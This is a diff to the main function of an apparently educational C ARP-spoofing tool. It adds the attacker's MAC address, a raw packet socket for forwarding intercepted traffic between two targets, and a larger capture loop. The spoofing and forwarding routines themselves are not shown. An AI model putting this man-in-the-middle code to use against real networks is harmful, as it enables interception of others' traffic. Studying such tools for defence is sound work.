@@ -3,6 +3,7 @@
 #include <arpa/inet.h> // for htons, inet_addr
 #include <pcap/pcap.h> // for pcap_loop
 #include <string.h> // for memcpy
+#include <stdlib.h> // for exit
 #include "find_target_ethernet_address.h"
 #include "find_ethernet_address.h"
 #include "arp_spoofing.h"
@@ -36,10 +37,19 @@ int main(int argc, char**argv) {
 	struct spoofing_attack *spoofing_attack = (struct spoofing_attack*) callback_args;
 	memcpy(spoofing_attack->target1_ethernet_address, target1_ethernet_address, ETH_ALEN);
 	memcpy(spoofing_attack->target2_ethernet_address, target2_ethernet_address, ETH_ALEN);
+	memcpy(spoofing_attack->man_in_the_middle_eth_address, find_ethernet_address("enp0s5"), ETH_ALEN);
 	memcpy(spoofing_attack->interface_name, "enp0s5", sizeof("enp0s5"));
 
+	int send_socket = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP));
+	if(send_socket < 0) {
+		printf("Failed to create send socket for fowarding.\n");
+		exit(1);
+	}
+	spoofing_attack->send_socket = send_socket;
+
 	pcap_t *handle = init_pcap("enp0s5");
-	pcap_loop(handle, 1000, forward, callback_args);
+	pcap_loop(handle, 100000, forward, callback_args);
+	printf("\n");
 	
 	return 0;
 }
